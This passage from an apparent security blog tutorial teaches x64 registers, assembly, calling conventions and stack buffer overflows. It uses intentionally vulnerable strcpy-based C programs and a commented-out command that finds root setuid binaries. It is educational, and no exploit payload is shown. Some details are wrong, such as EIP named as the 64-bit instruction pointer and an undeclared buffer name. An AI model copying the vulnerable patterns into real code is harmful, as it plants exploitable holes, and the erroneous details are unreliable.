and EFLAGS, there are also registers that control
important low-level system mechanisms such as virtual memory, interrupts, and
debugging.&lt;/p&gt;

&lt;p&gt;There are also model-specific registers (MSRs). As the name implies, these
registers may vary between different processors by Intel and AMD. Each MSR
is identified by name and a 32-bit number, and read/written to through the
RDMSR/WRMSR instructions.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h2 id=&quot;x64-architecture&quot;&gt;x64 Architecture&lt;/h2&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Since there are little to none 32 bit operating systems in real world, we will execute 
our practices on a 64-bit system. So we need to understand x64 architecture.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;X64 is an extension of x86, so most of the architecture properties are the same,
with minor differences such as register size and some instructions are unavailable. 
The following sections discuss the relevant differences.
&lt;img src=&quot;/assets/img/posts/binary-exploitation/6.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;
While RBP can still be used as the base frame pointer, it is rarely used for that
purpose in real-life compiler-generated code. Most x64 compilers simply treat
RBP as another GPR, and reference local variables relative to RSP.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h2 id=&quot;examining-the-registers-on-runtime&quot;&gt;Examining the Registers on Runtime&lt;/h2&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;We will use something called GDB (GNU Debugger). Debuggers are tools used by programmers to 
analyze compiled programs, step through them, examine the memory, CPU cache and registers.
A debugger can interfere the execution and change it along the way.
At the following picture, GDB is used to show the state of the processor registers right 
before the program starts.
&lt;img src=&quot;/assets/img/posts/binary-exploitation/7.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;A breakpoint set on the main() function. Therefore, when we run the program, debugger will
pause the execution when the program counter hits to the starting address of the main() function’s 
first instruction. Then we examine the registers with their latest values.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;There is one crucially special pointer register called &lt;strong&gt;instruction pointer&lt;/strong&gt; which tracks the execution of the program. The
instruction pointer is stored in the &lt;strong&gt;EIP&lt;/strong&gt; register, and it holds a 64-bit memory address.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The first four register, as mentioned above, are general purpose registers. And they are known 
as the &lt;strong&gt;Accumulator&lt;/strong&gt;, &lt;strong&gt;Counter&lt;/strong&gt;, &lt;strong&gt;Data&lt;/strong&gt; and &lt;strong&gt;Base&lt;/strong&gt; registers respectively.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;Following four registers are also GPRs. However, they are sometimes known as indexes and pointers.
These stand for &lt;strong&gt;Stack Pointer&lt;/strong&gt;, &lt;strong&gt;Base Pointer&lt;/strong&gt;, &lt;strong&gt;Source Index&lt;/strong&gt;, &lt;strong&gt;Destination Index&lt;/strong&gt; respectively.
&lt;strong&gt;RSP&lt;/strong&gt; and &lt;strong&gt;RBP&lt;/strong&gt; called pointers because they store 64-bit addresses, which essentially point to that location 
in the memory. These registers are fairly crucial to program execution and memory management. &lt;strong&gt;RSI&lt;/strong&gt; and &lt;strong&gt;RDI&lt;/strong&gt; 
are known as the &lt;strong&gt;Source and Destination Indexes&lt;/strong&gt;, they too are technically pointers. They are commonly used 
to point to the source and destination when data needs to be read from or written to.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The remaining EFLAGS registers in the picture ( [PF ZF IF] ) actually consists of several bit flags that
are used for comparisons and memory segmentations. The actual memory is
split into several different segments, which will be discussed later, and these
registers keep track of that. For the most part, these registers can be ignored
since they rarely need to be accessed directly&lt;/p&gt;

&lt;!-- ## Data Movement --&gt;
&lt;!-- x64 supports a concept referred to as RIP-relative addressing, which allows   --&gt;
&lt;!-- instructions to reference data at a relative position to RIP. For example: --&gt;
&lt;!-- 
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt; --&amp;gt;
&amp;lt;!-- 01: 0000000000000000 48 8B 05 00 00+ mov rax, qword ptr cs:loc_A --&amp;gt;
&amp;lt;!-- 02: ;                       originally written as &quot;mov rax,[rip]&quot; --&amp;gt;
&amp;lt;!-- 03: 0000000000000007 loc_A: --&amp;gt;
&amp;lt;!-- &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 --&gt;
&lt;!----&gt;
&lt;!-- Line 1 reads the address of loc_A (which is 0x7) and saves it in RAX. RIP- --&gt;
&lt;!-- relative addressing is primarily used to facilitate position-independent code. --&gt;

&lt;h1 id=&quot;assembly-languagae&quot;&gt;Assembly Languagae&lt;/h1&gt;
&lt;p&gt;Assembly language is the lowest level programming language that is intended to communicate directly with a computer’s hardware.
Each CPU comes with different instruction set. Therefore, an assembly 
programmer can not follow the common sense as they do with a compiled language. They have to read the actual CPU manual
book, and follow its own instructions to write their own program accordingly since assembly is converted directly 
to the machine code with no compilation process. When it comes to syntax, there are two common assembly syntaxes:
Intel and AT&amp;amp;T.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;how-assembly-works&quot;&gt;How Assembly Works?&lt;/h1&gt;
    &lt;p&gt;The assembly instructions in Intel syntax generally follow this style:&lt;br /&gt;&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;operation &amp;lt;destination&amp;gt; &amp;lt;source&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Depending on what operation is being used, those source and destination values will be treated accordingly as the 
operation code demands. The destination and source values will either be a register, a memory address, or a value
The operations are usually intuitive mnemonics.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;For example the &lt;strong&gt;MOV&lt;/strong&gt; operation will move a value from the source to the destination.
&lt;strong&gt;SUB&lt;/strong&gt; will substract the source value from the destination value, &lt;strong&gt;INC&lt;/strong&gt; will increment.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/binary-exploitation/8.png&quot; alt=&quot;&quot; /&gt;&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;The first instruction above will  move the value of the &lt;strong&gt;rsp&lt;/strong&gt; to &lt;strong&gt;rbp&lt;/strong&gt;. Then
the second instruction will subtract 0x10 from the value written in the &lt;strong&gt;rsp&lt;/strong&gt;.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;There are also flow control operations in the instruction set for the execution. &lt;strong&gt;CMP&lt;/strong&gt; operation
compares two values, any operation starts with a &lt;strong&gt;J&lt;/strong&gt; (jump) is being used to set the &lt;strong&gt;EIP&lt;/strong&gt; (Instruction Pointer,
we will come to that) into a 
different memory address value.&lt;/p&gt;

&lt;!-- ![](/assets/img/posts/binary-exploitation/4.png)&lt;br&gt; --&gt;

&lt;p&gt;We can see how that binary executable look like with a &lt;strong&gt;GNU developement tool&lt;/strong&gt; called &lt;strong&gt;objdump&lt;/strong&gt;. Let’s see what
that the &lt;strong&gt;main()&lt;/strong&gt; function had translated to.&lt;/p&gt;

&lt;!-- ![](/assets/img/posts/binary-exploitation/3.png)&lt;br&gt; --&gt;
&lt;!----&gt;
&lt;!-- Each byte is represented in hexadecimal notation, which is a base-16 numbering system, since it is more practical --&gt;
&lt;!-- to express an 8-bit value by using two characters instead of eight. The hex numbers at the far left ending with a colon are  --&gt;
&lt;!-- the memory addresses. Those addresses are where the instructions are getting stored as a collection of bytes for  --&gt;
&lt;!-- a temporary amount of time for the CPU to handle.&lt;br&gt; --&gt;
&lt;!----&gt;
&lt;!-- Memory can be thought as a row of bytes. Each row has a defined space (1 byte %99.9 of the time) and each defined  --&gt;
&lt;!-- space starts with an address. Therefore, when we say that we have a 64-bit processor we are saying that our CPU supports --&gt;
&lt;!-- 2^64 (18 billion) possible addresses.&lt;br&gt; --&gt;
&lt;!----&gt;
&lt;!-- The hex values at the middle are the machine language instructions for the processor. For example, let&apos;s examine the --&gt;
&lt;!-- first instruction. It is 0x55 (hexadecimal notation starts with a 0x as a rule of thumb) in hexadecimal,  --&gt;
&lt;!-- 85 in decimal when converted, and 1010101 in binary. Since processors can only handle ones and zeroes,  --&gt;
&lt;!-- that hex value being red as its binary value in the CPU. And for the current instruction set that operation code,  --&gt;
&lt;!-- which is 0x55, means : **push %rbp** in assembly language. And the texts at the far right, just like I said, --&gt;
&lt;!-- they are assembly code human-readable representations of the machine instructions.&lt;br&gt; --&gt;
&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;att-and-intel-syntax-differences&quot;&gt;AT&amp;amp;T and Intel Syntax Differences&lt;/h1&gt;
  &lt;/li&gt;
  &lt;li&gt;AT&amp;amp;T prefixes the register with %, and immediates with $. Intel does not
do this.&lt;/li&gt;
  &lt;li&gt;AT&amp;amp;T adds a prefix to the instruction to indicate operation width. For
example, MOVL (long), MOVB (byte), etc. Intel does not do this.&lt;/li&gt;
  &lt;li&gt;AT&amp;amp;T puts the source operand before the destination. Intel reverses the
order.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Intel&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;  mov ecx, AABBCCDDh
  mov ecx, [eax]
  mov ecx, eax&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;AT&amp;amp;T&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-assembly&quot; data-lang=&quot;assembly&quot;&gt;  movl $0xAABBCCDD, %ecx
  movl (%eax), %ecx
  movl %eax, %ecx&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Since Intel representation is much more clean and understandable, I will be using Intel syntax from now on.
It is worth to note that syntax does not mean anything for the CPU, it is there for humans.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Before continuing to this paper, &lt;a href=&quot;https://www.knucklesecurity.com/2022/12/02/memory-segmentation/&quot;&gt;&lt;strong&gt;visit this link.&lt;/strong&gt;&lt;/a&gt;
It is crucial to understand 
what is memory and how it is segmented in order to be able to understand rest of this paper.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;!-- # Stack Segment --&gt;
&lt;!----&gt;
&lt;!-- The stack segment is used as a temporary pile to store local function variables and context during function calls. --&gt;
&lt;!-- When a program calls for a function, EIP will point to the first instruction written for that function,  --&gt;
&lt;!-- and that function will have its own variables within its function scope, and a new stack frame will be created for that function.  --&gt;
&lt;!-- After a function call EIP does not immediately jumps to the address written on it, first the CPU pushes all the parameters passed --&gt;
&lt;!-- to that function to the stack, then, since the EIP have to go back to the instruction where it was left before the function call, --&gt;
&lt;!-- the return address and the stack base pointer will be passed to the stack. When the last instruction of the called function is read --&gt;
&lt;!-- by the EIP, return address and base pointer address pushed to the stack before the function call will be read and by the instruction --&gt;
&lt;!-- and stack pointer, and execution will continue from where it was left. All of this information is stored together on the stack in what  --&gt;
&lt;!-- is collectively called a stack frame. The stack contains many stack frames. --&gt;
&lt;!----&gt;
&lt;!-- In general computer science terms, a stack is an abstract data structure --&gt;
&lt;!-- that is used frequently. It has first-in, last-out (FILO) ordering, which means the first item that is put into a stack is the last  --&gt;
&lt;!-- item to come out of it. You can’t get the first bead off until you have removed all the other beads. When an item is placed into a stack, --&gt;
&lt;!-- it’s known as pushing, and when an item is removed from a stack, it’s called popping. --&gt;
&lt;!----&gt;
&lt;!-- Stack segment, as the name implies, is a stack data structure, which stores all the stack frames. The ESP (stack pointer) --&gt;
&lt;!-- is used to store the address of the last data pushed onto the stack. That address is constantly changin as the PUSH and POP  --&gt;
&lt;!-- operations are executed by the CPU. As this behavior being dynamic, just like heap, stack segment does not have a fixed size. --&gt;
&lt;!-- Stack segment grows upward in a visual listing of memory, toward lower memory addresses, as opposed to the heap. --&gt;
&lt;!----&gt;
&lt;!-- Several things are pushed into to the stack. The EBP (base pointer, sometimes called frame pointer FP),  --&gt;
&lt;!-- is used to reference local function variables in the current stack frame, it stores the starting address of the active stack frame. --&gt;
&lt;!-- Each stack frame contains parameters to the function, its local variables, and two pointers that are neccesarry to put things back  --&gt;
&lt;!-- the way they were. The saved frame pointer (SFP) and the return address. The SFP is used to restore EBP to its previous value, which  --&gt;
&lt;!-- is the starting address of the previous stack frame. And the return address is used to restore EIP to the next instruction found after  --&gt;
&lt;!-- the function call. This restores the functional context of the previous stack frame. --&gt;
&lt;!----&gt;

&lt;h1 id=&quot;function-invocation&quot;&gt;Function Invocation&lt;/h1&gt;

&lt;p&gt;When a function is called, the compiler uses, a stack frame (allocated within the program’s runtime stack) in order store all 
the temporary information that the function requires such as local variable. Depending on the calling convention the caller function 
will place the aforementioned information in specific registers or in the program stack or in both.
For example for the C calling convention (cdecl) on a 32-bit Linux operating system passes the function arguments
to the stack from in reverse order. For 64-bit binaries SysV is being used.&lt;br /&gt;
SysV calling convention requires up to six arguments to be placed 
to the RDI, RSI, RDX, RCX, R8 and R9 registers and anything additional to be placed in to the stack.
On Windows x64, there is only one calling convention and
the first four parameters are passed through RCX, RDX, R8, and R9; the remaining
are pushed on the stack from right to left.&lt;/p&gt;

&lt;p&gt;Let’s see a simple example, in order to understand this. The myfunc bellow takes 8 parameters:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/16.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;
&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/17.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As expected, the first six arguments are passed using the registers mentioned above, the last 
two h and g are “spilled” to the stack as well as the address to return after the function call,
the RBP, the local variables and a mysterious red zone, which according to the formal definition 
from the AMD64 ABI, is defined as follows:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-markdown&quot; data-lang=&quot;markdown&quot;&gt;The 128-byte area beyond the location pointed to by %rsp is considered to be reserved and 
shall not be modified by signal or interrupt handlers. Therefore, functions may use this 
area for temporary data that is not needed across function calls. In particular, leaf 
functions may use this area for their entire stack frame, rather than adjusting the stack 
pointer in the prologue and epilogue. This area is known as the red zone.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;There are many calling conventions (stdcall, fastcall, thiscall), each one of them 
defining a unique way on where the caller should place the parameters that the 
function called function requires, for our purpose though what is most important
is the fact that besides the parameters the stack frame contains the return address 
where the execution control will continue after the called function exits.&lt;/p&gt;

&lt;p&gt;It is better to examine how those parameters passed into register with a debugger.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/13.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;
&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/14.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first fours parameters are written to the EDI, ESI, EDX and ECX registers respectively. 
This confirms that our X64 Linux system compiles the source code with the SysV calling convention.&lt;/p&gt;

&lt;h1 id=&quot;canonical-addresses&quot;&gt;Canonical Addresses&lt;/h1&gt;

&lt;p&gt;While 64-bit processors have 64-bit wide registers, systems generally do not implement all 64-bits for addressing.
Thus, most architectures define an unimplemented region of the address space which the processor will consider invalid for use. 
Intel and AMD documentation says that for 64 bit mode only 48 bits are actually available for virtual addresses, and bits from 
48 to 63 must replicate bit 47 (sign-extension). Take a look in the memory mapping bellow to see how this concept applies:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/8.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see all the addresses are starting with &lt;strong&gt;0x0000&lt;/strong&gt;. The first two bytes are not being used for addressing.
In the picture there are only seven bytes are shown, don’t be confused, debuggers problem.&lt;/p&gt;

&lt;h1 id=&quot;virtual-addressing&quot;&gt;Virtual Addressing&lt;/h1&gt;

&lt;p&gt;If you debug two programs at the same time and examine the memory addresses, you will see those 
addresses are the same. But, how it would be possible, it should lead them to overwrite each other?
In reality, all the programs are loaded into their own virtual address space with virtual addresses, 
and they are mapped to physical memory addresses by Memory Management Unit (MMU). 
This can give more security, easier to manage programs than shared memory, 
and processes can also use more memory than actually available by technique of paging.
For more info read about Virtual addressing and paging.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/memory-segmentation/20.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;stack-based-buffer-overflow&quot;&gt;Stack Based Buffer Overflow&lt;/h1&gt;

&lt;p&gt;First we need a stack overflow vulnerable C code.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;myBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;!-- * # What Is a Buffer Overflow? --&gt;

&lt;p&gt;This program simply creates a 256 byte length buffer and copies the first command line argument in it.
So, why the program is vulnerable? Because it blindly copies the user input into a buffer. 
By blindly I mean that it simply doesn’t perform any size checks, while since we use strcpy function it 
is developer’s responsibility to make sure the size of the destination string is large enough to store the copied string.
For languages like, C or C++ which don’t have any built-in mechanism to check the data size which 
is copied from one memory destination to another, there is a possibility that this data will exceed 
the buffer’s capacity and this is the case where serious problems occur.&lt;/p&gt;

&lt;p&gt;Since the initialized and uninitialized local variables are stored in the stack, when the variable to which 
data will be written is smaller than the size of the data, a buffer overflow will occur.&lt;/p&gt;

&lt;p&gt;The C programming language has many “dangerous” functions that do not check bounds. These functions must be avoided, 
while in the unlikely event that they can’t, then the programmer must ensure that the bounds will never get exceeded. 
Some of these functions are the following:
strcpy(), strcat(), sprintf(), vsprintf(), gets().
These should be replaced with functions such as strncpy(), strncat(), snprintf(), and fgets() respectively. 
The function strlen should be avoided unless you can ensure that there will be a terminating NIL character 
to find. The scanf family (scanf, fscanf, sscanf, vscanf, vsscanf, and vfscanf) is often dangerous to use&lt;/p&gt;

&lt;!-- # SETUID --&gt;
&lt;!----&gt;
&lt;!-- Setuid bit enables user to execute the binary with the privileges of the user who owns the binary. Therefore,  --&gt;
&lt;!-- if a binary is owned by root and has an setuid bit, the binary will be executed as root irrespective of the  --&gt;
&lt;!-- user. The flags setuid and setgid are needed for tasks that require different privileges than what the user  --&gt;
&lt;!-- is normally granted, such as the ability to alter system files or databases to change their login password. --&gt;
&lt;!-- For example, **passwd** binary is a setuid executable. Sudo, su, chsh, ping, mount are other suid executable  --&gt;
&lt;!-- examples. --&gt;

&lt;!-- ![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/4.png){:.normal} --&gt;
&lt;!----&gt;
&lt;!-- However, if a setuid binary is implemented improperly it can cause problems such as granting root  --&gt;
&lt;!-- privileges to a non-root user, also called privilege escalation. Let&apos;s create a suid binary. --&gt;
&lt;!----&gt;
&lt;!-- ![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/5.png){:.normal} --&gt;
&lt;!-- ![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/6.png){:.normal} --&gt;
&lt;!----&gt;
&lt;!-- As you can see first, root owned the file and then put the setuid bit to the binary. --&gt;
&lt;!-- Even we run it as a non-root user, it executed as root user. --&gt;
&lt;!----&gt;
&lt;!-- There is a usefull script you can run in order to find all suid bit binaries owned by root. --&gt;
&lt;!-- 
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt; &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; find / &lt;span class=&quot;nt&quot;&gt;-user&lt;/span&gt; root &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
&amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
 --&gt;

&lt;!-- # Debugging the Binary --&gt;
&lt;!----&gt;
&lt;!-- There are many sections inside an executable like headers, .init, .got, .plt, .text, .fini  --&gt;
&lt;!-- and function definitions. You can view and disassemble them with **objdump**. Discussing them isn&apos;t  --&gt;
&lt;!-- in the scope of this paper for now. However, we will use GDB (GNU debugger) in order to debug  --&gt;
&lt;!-- ram segmentation and machine instructions. Here I disassembled the main function: --&gt;
&lt;!----&gt;
&lt;!-- ![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/7.png){:.normal} --&gt;
&lt;!----&gt;
&lt;!-- I discussed the memory-segmentation in one of my other papers. Even though it was examined  --&gt;
&lt;!-- on 32-bit system, the ideology is the same, you can reference to it. Other than that, the left  --&gt;
&lt;!-- is simple assembly machine instructions. If you are not familiar with the assembly I would recommend --&gt;
&lt;!-- you to gather basic knowledge on it before continuing to this paper. --&gt;
&lt;!-- # Back to the Vulnerable Program / Stack Smashing --&gt;

&lt;!-- fault. However, we need to be exact and see how many bytes we need to pass at minimum in order to create a buffer-overflow. --&gt;
&lt;!-- We will use GDB with gef extension for that.  --&gt;

&lt;!-- First let&apos;s create a pattern. --&gt;
&lt;!-- ![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/10.png){:.normal} --&gt;
&lt;!----&gt;
&lt;!-- Then lets check the RBP to examine the offset. --&gt;
&lt;!-- ![Desktop View](/assets/img/posts/stack-based-overflows-on-64bit-linux/11.png){:.normal} --&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;h1 id=&quot;overwriting-the-return-address&quot;&gt;Overwriting the Return Address&lt;br /&gt;&lt;/h1&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The idea behind for stack based buffer-overflows is to overwrite the saved return address and make the 
program continue from a memory address that we select.
Recall this diagram:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/17.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Stack grows towards the low memory addresses, however if there is a buffer created in that stack frame,
that buffer will grow towards the high memory addresses. For example consider the following:&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;myFunc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;myBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;strcpy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;myBuffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;**&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;myFunc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// argv[1] given as &amp;gt; &quot;Burak&quot;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;This particular code will copy the first argument that given to the program to one of its function’s local 
buffer. Let’s see how it is placed in the stack frame.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/18.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The first breakpoint in the debugger is set right after where the main()’s procedure prologue is complete.
So note the RSP-RBP.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;rsp -&amp;gt; 0xfe5b0&lt;br /&gt;
rbp -&amp;gt; 0xfe5c0&lt;/p&gt;

&lt;p&gt;main()’s stack frame is 16-bytes long.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/19.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The second breakpoint is set before the myFunc() returns.&lt;/p&gt;

&lt;p&gt;rsp -&amp;gt; 0xfe580&lt;br /&gt;
rbp -&amp;gt; 0xfe5a0&lt;/p&gt;

&lt;p&gt;myFunc()’s’ stack frame is 32-bytes long.&lt;/p&gt;

&lt;p&gt;If we substract the old stack pointer’s address from the new base pointer’s address:&lt;br /&gt;
0xfe5a0-0xfe5b0=-16&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;And it means that, between two stack frames, there is a 16-bytes long gap. This place is being 
used to store SFP (saved frame pointer-old base pointer) and the return address of the caller function. Therefore,
those addresses neither being stored in the main()’s stack frame nor the function()’s stack frame.&lt;br /&gt;&lt;/p&gt;

&lt;p&gt;In the following picture, I have dumped all the bytes from the myFunc()’s stack pointer through where the main()’s stack 
frame ends which is going to be 48Bytes.&lt;br /&gt;32Bytes(New Stack Frame)+16Bytes(SFP+RET)=48Bytes.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/posts/stack-based-overflows-on-64bit-linux/20.png&quot; alt=&quot;Desktop View&quot; class=&quot;normal&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see myBuffer grows toward the high memory addresses. Therefore, if we go far enough, we can 
overwrite the return address and set the RIP to another location. Remember the native behavior. That 
saved return address is the first machine instruction after the CALL in the main() function. Therefore,
leads program to return to the main() function.&lt;/p&gt;

